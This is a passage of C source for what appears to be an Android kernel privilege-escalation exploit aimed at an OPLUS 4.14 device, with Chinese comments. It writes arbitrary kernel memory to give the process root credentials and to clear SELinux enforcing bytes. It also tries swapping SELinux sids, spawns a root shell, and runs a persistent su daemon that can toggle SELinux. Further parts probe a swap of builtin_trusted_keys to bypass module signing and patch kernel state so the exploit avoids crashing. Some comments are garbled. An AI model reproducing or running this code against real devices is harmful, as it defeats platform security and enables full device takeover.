     * 白名单保证用setuid 家族改uid"不会被防护判为提权 但内核自身的能力检查     * 仍会审两局 cap_capable (cap_effective 已全置1 => 这 不     * SELinux cred_has_capability (sid 已置 1 => 一般过)。     * 若策略仍拆(EPERM), 就临时把 selinux_state 的enforcing 字节清0 (permissive
     * 时avc_has_perm 直接放行), 拿到 uid=0 后立刻原样还原。     * ★本机 selinux_state 是OPLUS 后移布局, enforcing 可能是+0 也可能是 +1,
     *   所以【运行时先读出来。 需要时把两字节一起清 0 (不靠猜。*/
    int perm = 0;
    uint32_t enf_old = 0;
    int have_enf = (kern_read4(fd, kb, kb + OFF_SELINUX_STATE, &enf_old) == 0);
    fprintf(stderr, "[*]   selinux_state(+0..3) = 0x%08x  (enforcing 字节应为其中的1)\n", enf_old);

    errno = 0;
    long r_uid = syscall(NR_setuid32, 0);
    fprintf(stderr, "[*]   ②syscall(213=setuid32, 0) -> %ld errno=%d  %s\n",
            r_uid, errno, r_uid == 0 ? "★OK (白名单号, 防护放行)" : "(!) 失败");
    sync();

    if (r_uid != 0 && have_enf) {
        /* ★反汇编实证: 本机 enforcing 字节在 selinux_state+2 (security_compute_av
         * ldrb [x19,#2]); +0/+1 (disabled/checkreqprot) 本来就是0。OPLUS 把
         * selinuxfs 的读接口硬编码成恒"1", 所以 getenforce 恒报 Enforcing。
         * 清 +0..+2 三字节 = 全局 permissive (保留 +3 initialized=1)。 */
        uint8_t z3[3] = { 0, 0, 0 };
        fprintf(stderr, "[*]   ③b setuid 被拒 -> 临时 permissive: selinux_state+0/+1/+2 清0\n");
        mark_stage("GR-pre-permissive-retry");
        kern_write(fd, kb + OFF_SELINUX_STATE, z3, 3);
        uint32_t chk = 0xdeadbeef;
        kern_read4(fd, kb, kb + OFF_SELINUX_STATE, &chk);
        fprintf(stderr, "[*]       读回 selinux_state = 0x%08x (期望 0x00000001, enforcing+2 已清)\n", chk);
        errno = 0;
        r_uid = syscall(NR_setuid32, 0);
        fprintf(stderr, "[*]   ③c 重试 setuid32(0) -> %ld errno=%d\n", r_uid, errno);
        perm = 1;
        sync();
    }

    errno = 0;
    long r_gid = syscall(NR_setgid32, 0);
    fprintf(stderr, "[*]   ②syscall(214=setgid32, 0) -> %ld errno=%d  %s\n",
            r_gid, errno, r_gid == 0 ? "★OK (白名单号, 防护放行)" : "(!) 失败");
    sync();

    /* ---- ④b 立刻还原 enforcing (此时若已 uid=gid=0, 防护对该进程已永久短路 ---- */
    if (perm) {
        /* 还原 +0..+2 (enf_old 低3字节), 保留 +3 initialized */
        uint8_t ob[3];
        ob[0] = (uint8_t)(enf_old & 0xff);
        ob[1] = (uint8_t)((enf_old >> 8) & 0xff);
        ob[2] = (uint8_t)((enf_old >> 16) & 0xff);
        mark_stage("GR-pre-permissive-restore");
        kern_write(fd, kb + OFF_SELINUX_STATE, ob, 3);
        uint32_t chk2 = 0;
        kern_read4(fd, kb, kb + OFF_SELINUX_STATE, &chk2);
        fprintf(stderr, "[*]   ④b 已还原selinux_state: 内0x%08x -> 读回 0x%08x\n", enf_old, chk2);
        sync();
    }

    /* ---- ②setuid/setgid 会产生【新的cred 对象。 重新取一次---- */
    uint64_t cred2 = 0;
    if (kern_read8(fd, kb, self_task + TASK_CRED_OFF, &cred2) == 0 && cred2) {
        fprintf(stderr, "[*]   ②setuid 后task->cred = 0x%llx (时0x%llx)%s\n",
                (unsigned long long)cred2, (unsigned long long)cred,
                cred2 == cred ? " ——未换对象" : " ——已换新cred");
        if (cred2 != cred) {
            uint32_t u2 = 0xdead, e2 = 0xdead, s2 = 0xdead;
            kern_read4(fd, kb, cred2 + 0x04, &u2);
            kern_read4(fd, kb, cred2 + 0x14, &e2);
            kern_read4(fd, kb, cred2 + 0x1c, &s2);
            fprintf(stderr, "[*]      新cred: uid=%u euid=%u fsuid=%u (期望 0/0/0)\n", u2, e2, s2);
            uint64_t sec2 = 0;
            if (kern_read8(fd, kb, cred2 + CRED_SECURITY_OFF, &sec2) == 0 && sec2) {
                uint32_t lo = 0, hi = 0;
                kern_read4(fd, kb, sec2, &lo);
                kern_read4(fd, kb, sec2 + 4, &hi);
                fprintf(stderr, "[*]      新cred->security=0x%llx osid=%u sid=%u\n",
                        (unsigned long long)sec2, lo, hi);
            }
        }
        cred = cred2;   /* ★之后一律操作当前cred */
    }
    sync();
    mark_stage("GR8-setuid-done");

    /* =====================================================================
     * ★②SELinux 域实验 uid=0 + 全cap 只解决了 DAC; MAC 仍把我们框在 u:r:shell:s0。     *   此时 uid=gid=0, 可root 防护已对该进程【永久短路。 不cred 已是私有副本,
     *   所以可以安全地逐个试候选sid, 用【真实文件可读性】当判据, 一次跑完给结论。     *   候选 1 = SECINITSID_KERNEL; init(pid1, init_task.tasks.next) 的sid。     *   每个候选试完立刻测 access(); 不行就还原成原sid, 最后保留能用的那个。     * ===================================================================== */
    {
        const char *probe = "/data/system/packages.xml";
        uint64_t mysec = 0;
        uint32_t myosid0 = 0, mysid0 = 0;
        /* ★★ 真机结论: 本机对【特权域(shell 之外)】的 SELinux 拒绝会让进程永久阻塞
         *    (实测 sid=1/kernel 不sid=66/init 都在 access() 处卡死 者shell 域的拒绝
         *     只是返回 EACCES)。所以据sid 提权"这条在本机不可行;
         *    --permissive 时直接跳过整个实验 用全局 permissive 放开。*/
        if (opt_permissive) {
            fprintf(stderr, "[*]   ②--permissive 已开: 跳过换域实验(本机特权域拒绝会阻塞)\n");
            goto selinux_permissive;
        }
        kern_read8(fd, kb, cred + CRED_SECURITY_OFF, &mysec);
        kern_read4(fd, kb, mysec, &myosid0);
        kern_read4(fd, kb, mysec + 4, &mysid0);
        errno = 0;
        int a0 = (access(probe, R_OK) == 0);
        int e0 = errno;
        fprintf(stderr, "[*]   ②改域前 本进程sid=%u, 证%s -> %s (errno=%d)\n",
                mysid0, probe, a0 ? "OK" : "DENIED", e0);

        /* init 的sid: init_task.tasks.next 通常就是 pid 1 */
        uint32_t init_sid = 0;
        uint64_t first = 0;
        char fc[16] = {0};
        if (kern_read8(fd, kb, kb + OFF_INIT_TASK + TASK_TASKS_OFF, &first) == 0 && first) {
            uint64_t ft = first - TASK_TASKS_OFF, fcr = 0, fsec = 0;
            kern_read8(fd, kb, ft + TASK_COMM_OFF, &fcr);
            memcpy(fc, &fcr, 8);
            kern_read8(fd, kb, ft + TASK_CRED_OFF, &fcr);
            if (fcr) kern_read8(fd, kb, fcr + CRED_SECURITY_OFF, &fsec);
            if (fsec) kern_read4(fd, kb, fsec + 4, &init_sid);
            fprintf(stderr, "[*]      首任务comm=\"%s\" task=0x%llx cred=0x%llx security=0x%llx sid=%u\n",
                    fc, (unsigned long long)ft, (unsigned long long)fcr,
                    (unsigned long long)fsec, init_sid);
        }

        /* 再找 system_server 的sid 作为第二候选(它才是平时读 /data/system 的那个域) */
        uint32_t ss_sid = 0;
        {
            uint64_t hd = kb + OFF_INIT_TASK + TASK_TASKS_OFF;
            uint64_t pp = 0, want = 0;
            memcpy(&want, "system_s", 8);
            kern_read8(fd, kb, hd, &pp);
            int k = 0;
            while (pp && pp != hd && k++ < 8192) {
                uint64_t task = pp - TASK_TASKS_OFF, c8 = 0, nx = 0;
                if (kern_read8(fd, kb, task + TASK_COMM_OFF, &c8) != 0) break;
                if (c8 == want) {
                    uint64_t cc = 0, ssec = 0;
                    kern_read8(fd, kb, task + TASK_CRED_OFF, &cc);
                    if (cc) kern_read8(fd, kb, cc + CRED_SECURITY_OFF, &ssec);
                    if (ssec) kern_read4(fd, kb, ssec + 4, &ss_sid);
                    fprintf(stderr, "[*]      system_server task=0x%llx cred=0x%llx security=0x%llx sid=%u\n",
                            (unsigned long long)task, (unsigned long long)cc,
                            (unsigned long long)ssec, ss_sid);
                    break;
                }
                if (kern_read8(fd, kb, task + TASK_TASKS_OFF, &nx) != 0 || nx == pp) break;
                pp = nx;
            }
        }

        uint32_t cand[4];
        int nc = 0;
        /* ★顺序很重要 sid=1(u:r:kernel:s0) 在本机会因拒绝->审计"把进程彻底卡死         *   (共享 cred 时已经把整机搞挂过一次, 所以【默认绝不试 sid=1】。         *   先试 init 的sid, 再试 system_server 的sid。*/
        if (ss_sid && ss_sid != 1) cand[nc++] = ss_sid;
        if (init_sid && init_sid != 1 && init_sid != ss_sid) cand[nc++] = init_sid;
        if (opt_try_kernel_sid) cand[nc++] = 1;
        cand[nc++] = 0;                       /* 结束标记 */

        int kept = -1;
        for (int i = 0; i < nc; i++) {
            if (!cand[i]) break;
            uint32_t ids[2] = { cand[i], cand[i] };
            errno = 0;
            ssize_t w = kern_write(fd, mysec, ids, 8);
            uint32_t r1 = 0, r2 = 0;
            kern_read4(fd, kb, mysec, &r1);
            kern_read4(fd, kb, mysec + 4, &r2);
            errno = 0;
            int a = (access(probe, R_OK) == 0);
            int e = errno;
            fprintf(stderr, "[*]      证sid=%u: pwrite -> %zd 读回 osid=%u sid=%u ; access -> %s (errno=%d)\n",
                    cand[i], w, r1, r2, a ? "★OK" : "DENIED", e);
            sync();
            if (a) { kept = i; break; }
        }
        if (kept < 0) {
            uint32_t ids[2] = { myosid0, mysid0 };
            kern_write(fd, mysec, ids, 8);
            fprintf(stderr, "[*]      所有候选sid 都被拒-> 已还原sid=%u; "
                            "需要真正放开 MAC 就得用--permissive\n", mysid0);
        }
        errno = 0;
        FILE *f = fopen("/proc/self/attr/current", "r");
        if (f) { char b[160] = {0}; if (fgets(b, sizeof(b)-1, f)) { b[strcspn(b, "\r\n")] = 0;
                 fprintf(stderr, "[*]      现在 /proc/self/attr/current = \"%s\"\n", b); } fclose(f); }
        (void)e0;
        sync();
    }

    selinux_permissive:
    if (opt_permissive) {
        uint8_t z3[3] = { 0, 0, 0 };   /* ★enforcing 在 +2, 清 +0..+2 */
        mark_stage("GR-pre-permissive-write");
        kern_write(fd, kb + OFF_SELINUX_STATE, z3, 3);
        uint32_t chk = 0;
        kern_read4(fd, kb, kb + OFF_SELINUX_STATE, &chk);
        mark_stage("GR8b-permissive-done");
        errno = 0;
        int a = (access("/data/system/packages.xml", R_OK) == 0);
        int e1 = errno;
        errno = 0;
        int a2 = (access("/data/data", R_OK | X_OK) == 0);
        int e2 = errno;
        fprintf(stderr, "[*]   ⑥b --permissive: selinux_state 读回 0x%08x; "
                        "access(packages.xml) -> %s (errno=%d); access(/data/data) -> %s (errno=%d)\n",
                chk, a ? "★OK" : "DENIED", e1, a2 ? "★OK" : "DENIED", e2);
        fprintf(stderr, "[*]      注意: 该模式下 SELinux 保持关闭, 设备安全性下降(重启即恢复\n");
        sync();
    }

    /* ---- 收尾: 还原 busy_read ---- */
    if (busy_read_restore(fd, kb) == 0)
        fprintf(stderr, "[*]   已还原busy_read 的ctl_table.data 指针与值\n");
    else
        fprintf(stderr, "[!]   还原 busy_read 失败\n");
    sync();
    mark_stage("GR9-busyread-restored");

    /* ---- 进程内自证---- */
    get_root_proof();
    mark_stage("GR10-proof-done");

    /* ---- ★第三十六轮 路线B (模块签名闸门) 探针 ---- */
    if (opt_ksu_probe)
        ksu_probe(fd, kb, self_task, opt_ksu_probe_der, opt_ksu_mod_a, opt_ksu_mod_b, opt_ksu_mod_r);

    /* ---- 另起子进程做 exec 级自证/ 交互 shell ---- */
    pid_t c = fork();
    if (c == 0) {
        if (want_shell) {
            fprintf(stderr, "[*]   子进程 exec /system/bin/sh -i (交互 root shell)\n");
            execl("/system/bin/sh", "sh", "-i", (char *)NULL);
            execl("/system/bin/sh", "sh", (char *)NULL);
        } else {
            const char *cc = cmd ? cmd
                : "id; echo -n 'attr/current: '; cat /proc/self/attr/current; getenforce";
            execl("/system/bin/sh", "sh", "-c", cc, (char *)NULL);
        }
        _exit(127);
    }
    if (c > 0) {
        int st = 0;
        waitpid(c, &st, 0);
        fprintf(stderr, "[*]   证明子进程退出status=0x%x%s\n", st,
                (st & 0xff) == 127 ? "  (!) exec 失败(127) ——SELinux exec 转换被拒, 但进程内 uid 已为 0" : "");
    } else {
        fprintf(stderr, "[!]   fork 失败 errno=%d\n", errno);
    }
    sync();
    return geteuid() == 0 ? 0 : -1;
}


static void usage(const char *p) {
    fprintf(stderr,
        "用法: %s [--slide 0x...] [--dry] [--iters N] [--nice-lo N] [--nice-hi N] [--no-pin]\n"
        "          [--exit] [--ptr-value] [--target 0xADDR] [--v 0xADDR] [--probe]\n"
        "          [--aw-udp] [--aw-nowrite] [--leak-only]\n"
        "          [--T 0xADDR] [--oneshot] [--force-consume] [--aw-pp] [--aw-fops]\n"
        "          [--shell] [--cmd \"...\"] [--no-root] [--unlock-flag]\n"
        "  --no-root     : ★只做任意内核读写自证, 不改 cred (安全复现)\n"
        "  --unlock-flag : ★额外把g_boot_state 置1 (op 可root 的is_unlocked 直接放行)\n"
        "  --write-bootstate : ★强制尝试 g_boot_state 写(该页只读必崩, 仅离线验证用)\n"
        "  --no-restore-fops : ★用完不还原ashmem_misc.fops (危险, 仅调试 默认【立刻还原。\n"
        "  --shell       : ★第三十五轮 拿到 root 后在子进程exec /system/bin/sh -i\n"
        "  --ksu-probe <DER> : ★第三十六轮 建会话钥匙环 + 塞入自签证书, 证cred+0x58 与\n"
        "                      builtin_trusted_keys(_text+0x2233890, .bss) 原值(只读, 不交换\n"
        "                      之后用root 守护完成交换:\n"
        "                        ./stage1 --su '!ksu'          # 只读复查\n"
        "                        ./stage1 --su '!ksu swap'     # 交换 builtin_trusted_keys\n"
        "                        ./stage1 --su '!ksu restore'  # 还原\n"
        "  --alias-probe : ⚠️ 危险, 默认关闭: 读【猜测的】linear-map 别名 -> 未映射即 oops+重启 (ZI11)\n"
        "  --ksu-mod-a/-b <ko> : ★第三十六轮A/B 试纸: A=原样 vendor 模块(期望 EEXIST),\n"
        "                        B=改1 字节的同款期望 EKEYREJECTED); 交换 builtin_trusted_keys 后\n"
        "                        内insmod A, 若变成EKEYREJECTED => 验签已改看我们的钥匙环(路线B 成立)\n"
        "  --cmd \"...\"   : ★第三十五轮 拿到 root 后在子进程用 root 身份执行该命令\n"
        "  --aw-fops     : ★第三十四轮 内ashmem_misc.fops = F(载波线程 pselect 栈上的伪 fops 行,\n"
        "                  随后 open(/dev/ashmem)+ASHMEM_SET_NAME+pread 验证任意内核读写\n"
        "  --T 0x..      : 手工指定 T(跳过 perf 泄露)   --oneshot : 消费者只放行一发\n"
        "  --aw-pp       : 靶点换成 sysctl_perf_event_paranoid (用户态可 cat 验证的oracle)\n"
        "  默认靶点 inet6_protos[%d] 0x%llx, 写入值0x%llx (=&inet6_protos[19], 全0 槽\n"
        "  --target 0x.. : 显式指定写目标必须满足 *(u32*)(t-8)==0 不*(u64*)(t+0x10)&~1==0)\n"
        "  --v 0x..      : 显式指定写值V (必须是可读可写且 +8 不0 的内核地址)\n"
        "  --probe       : 把一个零填充的用户页当target (形状 B/V=0) -> PAN 判定 + &W 泄露\n",
        p, IPPROTO_UDP_IDX, (unsigned long long)INET6_TARGET, (unsigned long long)INET6_VALUE);
}

/* ============================================================================
 * ★★★第三十五轮· root 守护 ("设root 真正可用")
 *
 * 为什么不用KernelSU / Magisk (本机硬性不可行):
 *   - 两者都必须放boot.img 再刷回 而本机flash.locked=1 / verifiedbootstate=green
 *     => fastboot 刷机被BL 拆
 *   - KernelSU 官方版依走GKI(内核 5.10+/Android 12+), 本机是4.14 非GKI;
 *     LKM 模式需要与该内核精确匹配的 .ko(vermagic + Module.symvers), 没有 OPLUS 源码树
 *   - Magisk 的magiskinit/magiskboot 是引导期补丁; magiskd 在Enforcing 下还要 *     magiskpolicy --live 改策略 而本机一改自身sid 就卡死ZI4)。 * 所以这里自己做: 一个常驻root 守护 + AF_UNIX su socket, 并且内置
 *   "按需开关SELinux" ——平时 Enforcing, 要用时瞬间放开, 用完收回。 *
 * 协议(一行:
 *   "" 成"-i"      -> 起一个交互式 /system/bin/sh, socket 当stdio
 *   "!selinux 0/1"  -> 全开 SELinux 强制 (由守护自己用任意写完成
 *   "!id"           -> 守护自报状态 *   其它            -> /system/bin/sh -c <该行>
 * 客户立同一个二进制):
 *   ./stage1 --su "id; ls /data/data"
 *   ./stage1 --su-shell          # 交互开root shell
 * ==========================================================================*/
#define SU_SOCK_PATH "/data/local/tmp/su.sock"
static int g_su_fd = -1;
static uint64_t g_su_kb = 0;
static int g_su_sel_ready = 0;

static int su_connect(void) {
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un sa;
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    strncpy(sa.sun_path, SU_SOCK_PATH, sizeof(sa.sun_path) - 1);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) { close(fd); return -1; }
    return fd;
}

static void su_spawn(int cfd, const char *line) {
    pid_t p = fork();
    if (p != 0) return;
    dup2(cfd, 0); dup2(cfd, 1); dup2(cfd, 2);
    if (cfd > 2) close(cfd);
    if (!line || !line[0] || !strcmp(line, "-i")) {
        execl("/system/bin/sh", "sh", "-i", (char *)NULL);
        execl("/system/bin/sh", "sh", (char *)NULL);
    } else {
        execl("/system/bin/sh", "sh", "-c", line, (char *)NULL);
    }
    _exit(127);
}

/* ============================================================================
 * ★★ ZT51: 根治"退出即 oops"——把file->f_op 从伪表改回真表 *
 * 现场 (ZT50 实测 oops):
 *   do_group_exit -> do_exit -> exit_files -> put_files_struct+0xb0 -> filp_close+0x38
 *   lr = filp_close+0x38, pc = 野指针 =>  file->f_op->flush 是垃圾 * 拆雷(把F+0x68 内0) 挡不住它, 因为:
 *   (a) 没有任何回读校验, 写没落地也不知道;
 *   (b) F 活在载波线程的内核栈上 载波一旦从 pselect 返回, F 就被栈帧重新盖成垃圾,
 *       者file->f_op 依旧指着 F ——每关闭一次就再炸一次
 * 正解: 让【没有任何fd 还指着 F。 用本机反汇编出来的fd 表偏移逐个改写 f_op.
 * ==========================================================================*/

/* 用comm 认领自身 task_struct (不get_root 里那套同一算法, 但用主线程的 comm) */
static int gl_find_self_task(int fd, uint64_t kb, uint64_t *out)
{
    uint64_t me8 = 0, me8b = 0;
    if (!g_self_comm[0]) { fprintf(stderr, "[!] gl_find_self_task: 自身 comm 未知\n"); return -1; }
    memcpy(&me8, g_self_comm, 8);
    memcpy(&me8b, g_self_comm + 8, 8);
    uint64_t head = kb + OFF_INIT_TASK + TASK_TASKS_OFF;
    uint64_t p = 0;
    if (kern_read8(fd, kb, head, &p) != 0) return -1;
    int n = 0;
    while (p && p != head && n < 8192) {
        uint64_t task = p - TASK_TASKS_OFF, c8 = 0, c8b = 0;
        if (kern_read8(fd, kb, task + TASK_COMM_OFF, &c8) != 0) return -1;
        if (c8 == me8 && kern_read8(fd, kb, task + TASK_COMM_OFF + 8, &c8b) == 0 && c8b == me8b) {
            *out = task;
            return 0;
        }
        uint64_t nxt = 0;
        if (kern_read8(fd, kb, task + TASK_TASKS_OFF, &nxt) != 0) return -1;
        if (nxt == p) break;
        p = nxt; n++;
    }
    fprintf(stderr, "[!] gl_find_self_task: 遍历 %d 个任务没找到 comm=\"%s\"\n", n, g_self_comm);
    return -1;
}

/* 任意地址读len 字节 (kern_read4 只支持4 字节, 这里挂4 字节窗口读再移位) */
static int gl_read_bytes(int fd, uint64_t kb, uint64_t addr, uint8_t *buf, int len)
{
    int i = 0, bad = 0;
    while (i < len) {
        uint64_t a = addr + (uint64_t)i, base = a & ~3ULL;
        uint32_t w = 0;
        if (kern_read4(fd, kb, base, &w) != 0) { bad = 1; w = 0; }
        for (int k = 0; k < 4 && i < len; k++, i++)
            buf[i] = (uint8_t)(w >> (8 * (unsigned)(a + (uint64_t)k - base)));
    }
    return bad ? -1 : 0;
}

/* ★★★ZT52: 把自身各线程那条【被破坏的PI 链】在进程存活时就摘干净.
 *
 * 现场 (ramoops 262KB, 软重启后):
 *   rt_mutex_adjust_prio_chain+0x1d8  <- 无限循环
 *   remove_waiter+0x198
 *   rt_mutex_cleanup_proxy_lock+0x4c
 *   futex_lock_pi+0x714  -> do_futex -> compat_SyS_futex
 *   => RCU expedited stall (CPU1/CPU2 打转) => OPPO shutdown_detect 在 *      shutdown_detect.c:559 主动 BUG() => panic => 重启.
 * 成因: waiter 任务的pi_blocked_on 指着伪rt_mutex_waiter W, 者W 活在
 *   waiter 内核栈上、早被后续栈帧盖成垃圾 杀进程时内核从 pi_state owner
 *   (= waiter 任务) 走下去就永远走不完
 * 修法: 遍历任务行 把自身线程(comm = gLk<pid> 成stage1) 重pi_blocked_on
 *   非0 的全部写 0 ——内核自己的remove_waiter 稍后也是把它置NULL,
 *   所以提前置 0 与内核语义一致 而链走会在+0x70 的cbz 处立即返回 */
static int gl_clear_pi_blocked_on(int fd, uint64_t kb, int do_write, int outfd)
{
    uint64_t me8 = 0;
    uint64_t head = kb + OFF_INIT_TASK + TASK_TASKS_OFF, p = 0;
    int n = 0, matched = 0, hit = 0, fixed = 0, allnz = 0;

    if (!g_self_comm[0]) { dprintf(outfd, "  [!] 自身 comm 未知, 跳过 PI 清理\n"); return -1; }
    memcpy(&me8, g_self_comm, 8);

    if (kern_read8(fd, kb, head, &p) != 0) { dprintf(outfd, "  [!] 证init_task.tasks 失败\n"); return -1; }
    while (p && p != head && n < 8192) {
        uint64_t task = p - TASK_TASKS_OFF, c8 = 0, pbo = 0, nxt = 0;
        if (kern_read8(fd, kb, task + TASK_COMM_OFF, &c8) != 0) break;
        /* ★★★ ZT52b 关键修正: 线程的 task->comm 尾部是 fork 时从父进程继承下来的
         *   旧名字残留 —— 内核 set_task_comm() 用的是 strlcpy(), 【不会】把后面的字节补 0。
         *   所以 [8..15] 里是垃圾, 比较 c8b == 0 必然失败, 结果只有主线程 (名字正好 8 字节,
         *   第 9 字节是 NUL) 能匹配上 -> stage1 的四个线程全被静默漏掉。
         *   正解: stage1 只比前 6 字节; gLk<pid> 比完整 8 字节。 */
        uint64_t c6 = c8 & 0x0000FFFFFFFFFFFFULL;
        int mine = (c6 == GL_COMM6_STAGE1) || (c8 == me8);
        if (kern_read8(fd, kb, task + TASK_PI_BLOCKED_ON_OFF, &pbo) != 0) {
            if (mine) dprintf(outfd, "  [PI] task=0x%llx comm8=0x%016llx 读 pi_blocked_on 失败 ✗\n",
                              (unsigned long long)task, (unsigned long long)c8);
        } else if (pbo) {
            allnz++;
            dprintf(outfd, "  [PI%s] task=0x%llx comm8=0x%016llx pi_blocked_on=0x%llx\n",
                    mine ? "" : "-other", (unsigned long long)task, (unsigned long long)c8,
                    (unsigned long long)pbo);
            if (mine) {
                hit++;
                if (do_write) {
                    uint64_t z = 0, rb = 1;
                    if (kern_write(fd, task + TASK_PI_BLOCKED_ON_OFF, &z, 8) == 8 &&
                        kern_read8(fd, kb, task + TASK_PI_BLOCKED_ON_OFF, &rb) == 0 && rb == 0) {
                        dprintf(outfd, "       -> pi_blocked_on := 0 回读=0 ★这条 PI 链走会立即终止\n");
                        fixed++;
                    } else {
                        dprintf(outfd, "       -> 清零失败/回读=0x%llx ✗\n", (unsigned long long)rb);
                    }
                }
            }
        } else if (mine) {
            matched++;
        }
        if (kern_read8(fd, kb, task + TASK_TASKS_OFF, &nxt) != 0) break;
        if (nxt == p) break;
        p = nxt; n++;
    }
    dprintf(outfd, "  => 遍历 %d 个任务; comm 匹配自身线程 %d 个, pi_blocked_on!=0: 自身 %d 个 / 全系统 %d 个; 清零成功 %d 个 %s\n",
            n, matched, hit, allnz, fixed, (hit > 0 && fixed == hit) ? "★★★PI 地雷已拆" :
                                           (hit == 0 ? "(自身没有)" : "(有失败项!)"));
    return matched;
}


static int gl_fix_fops(int fd, uint64_t kb, int do_write, int outfd)
{
    uint64_t self = 0, files = 0, fdt = 0, fdarr = 0, ofds = 0;
    uint32_t maxf = 0;
    if (gl_find_self_task(fd, kb, &self) != 0) return -1;
    if (kern_read8(fd, kb, self + TASK_FILES_OFF, &files) != 0 || !files) {
        dprintf(outfd, "  [!] 证task->files(0x%llx+0x%llx) 失败 (files=0x%llx)\n",
                (unsigned long long)self, (unsigned long long)TASK_FILES_OFF, (unsigned long long)files);
        return -1;
    }
    if (kern_read8(fd, kb, files + FILES_FDT_OFF, &fdt) != 0 || !fdt) {
        dprintf(outfd, "  [!] 证files->fdt(0x%llx+0x%llx) 失败 (fdt=0x%llx)\n",
                (unsigned long long)files, (unsigned long long)FILES_FDT_OFF, (unsigned long long)fdt);
        return -1;
    }
    if (kern_read4(fd, kb, fdt + FDT_MAX_FDS_OFF, &maxf) != 0) return -1;
    if (kern_read8(fd, kb, fdt + FDT_FD_OFF, &fdarr) != 0 || !fdarr) return -1;
    kern_read8(fd, kb, fdt + FDT_OPEN_FDS_OFF, &ofds);
    if (maxf > 65536) maxf = 65536;
    dprintf(outfd, "  self=0x%llx files=0x%llx fdt=0x%llx fd[]=0x%llx open_fds=0x%llx max_fds=%u\n",
            (unsigned long long)self, (unsigned long long)files, (unsigned long long)fdt,
            (unsigned long long)fdarr, (unsigned long long)ofds, maxf);
    if (fdarr < 0xffffff8000000000ULL || fdt < 0xffffff8000000000ULL) {
        dprintf(outfd, "  [!] fd[]/fdt 地址不合法-> 拒绝继续\n");
        return -1;
    }

    uint64_t F = g_region[0];
    uint64_t real = kb + OFF_ASHEMEM_FOPS;
    int nbad = 0, nfix = 0;
    for (uint32_t i = 0; i < maxf; i++) {
        uint64_t file = 0, fop = 0;
        if (kern_read8(fd, kb, fdarr + (uint64_t)i * 8, &file) != 0) continue;
        if (!file) continue;
        if (kern_read8(fd, kb, file + FILE_FOP_OFF, &fop) != 0) continue;
        if (fop != F) continue;
        nbad++;
        dprintf(outfd, "  fd %u : file=0x%llx f_op=0x%llx == F <-- 地雷\n",
                i, (unsigned long long)file, (unsigned long long)fop);
        if (do_write) {
            if (kern_write(fd, file + FILE_FOP_OFF, &real, 8) == 8) {
                uint64_t rb = 0;
                if (kern_read8(fd, kb, file + FILE_FOP_OFF, &rb) == 0 && rb == real) {
                    dprintf(outfd, "        -> f_op := 0x%llx (真ashmem_fops) 回读一致★\n",
                            (unsigned long long)real);
                    nfix++;
                } else {
                    dprintf(outfd, "        -> 改写后回读0x%llx 不一致✗\n", (unsigned long long)rb);
                }
            } else {
                dprintf(outfd, "        -> kern_write 失败 errno=%d ✗\n", errno);
            }
        }
    }
    dprintf(outfd, "  => 扫描 %u 个 fd, f_op==F 命中 %d 个, 改写成功 %d 个%s\n",
            maxf, nbad, nfix, nbad == 0 ? "  ★已无敌雷" : "");
    return nbad;
}

/* 枚举 /proc/self/fd, 对所有/dev/ashmem* 的fd 调用 close().
 * ★只在确认 F+0x68 == 0 之后才允许调用——否则 close 会立刻踩响地雷 */
static int gl_close_ashmem(int outfd)
{
    DIR *d = opendir("/proc/self/fd");
    int n = 0;
    if (!d) { dprintf(outfd, "  [!] opendir(/proc/self/fd) 失败 errno=%d\n", errno); return -1; }
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.') continue;
        char num[16];
        snprintf(num, sizeof(num), "%s", e->d_name);
        char path[64], tgt[256];
        snprintf(path, sizeof(path), "/proc/self/fd/%s", num);
        ssize_t k = readlink(path, tgt, sizeof(tgt) - 1);
        if (k <= 0) continue;
        tgt[k] = 0;
        if (!strstr(tgt, "ashmem")) continue;
        int f = atoi(num);
        if (f <= 2) continue;
        if (close(f) == 0) { n++; dprintf(outfd, "  close(%d) [%s] ok\n", f, tgt); }
        else dprintf(outfd, "  close(%d) [%s] 失败 errno=%d\n", f, tgt, errno);
    }
    closedir(d);
    dprintf(outfd, "  => 关闭 ashmem fd 全%d 个\n", n);
    return n;
}

/* ★★ ZT32 拆雷：把会fops 行teardown 会走到的槽，在【栈上那份真副本】里清零。 *
 * ★ZT51 修正: 必须常kb 且必须【回读校验】——只打即kern_write 的返回值证明不了 *   那个 0 真的地F+0x68 不(ZT50 实测就是写了但仍点. 回读非0 时明确报错
 *
 * 必须在运行时用kern_write 内g_region[0] (=F)，而不是只改用户态g_tbl[0]） * 内核只在进入 select 时把 FDS_BYTES(select_n) 个字节拷上栈，超出部分本来就是栈残留， * 所以缓冲区里写 0 并不能保证栈上那份是 0。 *
 * 只碰 .flush@0x68 / .fsync@0x78 / .fasync@0x80 ——它们都在 fd_set 位图之外： * 清零不会动到载波的select 布防。poll@0x40 可能仍在位图里，坚决不动。 */
static int fops_defuse(int fd, uint64_t kb)
{
    static const struct { uint64_t off; const char *nm; } t[] = {
        { 0x68, ".flush" },
        { 0x78, ".fsync" },
        { 0x80, ".fasync" },
    };
    uint64_t z = 0;
    size_t i;
    int bad = 0;

    if (!g_region[0]) {
        fprintf(stderr, "[!] 拆雷: F 未知 (g_region[0]==0), 跳过\n");
        return -1;
    }
    for (i = 0; i < sizeof(t) / sizeof(t[0]); i++) {
        ssize_t r = kern_write(fd, g_region[0] + t[i].off, &z, 8);
        /* ★ZT51: 回读校验 ——没有回读的写入成功"是无效证据(ZT50 的教设 */
        uint64_t rb = 0xdeadbeefdeadbeefULL;
        int rok = kern_read8(fd, kb, g_region[0] + t[i].off, &rb);
        if (r == 8 && rok == 0 && rb == 0) {
            fprintf(stderr, "[*] 拆雷: *(u64*)(F=0x%llx + 0x%llx) = 0 回读=0  (%s) ★\n",
                    (unsigned long long)g_region[0],
                    (unsigned long long)t[i].off, t[i].nm);
        } else {
            fprintf(stderr, "[!] 拆雷失败 %s: kern_write=%zd errno=%d  回读(rok=%d)=0x%llx\n",
                    t[i].nm, r, errno, rok, (unsigned long long)rb);
            bad = 1;
        }
    }
    fprintf(stderr, "[*] 拆雷完成%s —— 但 ZT51 已证伪「靠这 3 个 0 就能安全退出」:\n"
                    "    file->f_op 仍指着 F, 载波 pselect 一旦返回F 就会被栈帧盖掉。\n"
                    "    真正的修法是 !fixfops 把file->f_op 改回真表。\n",
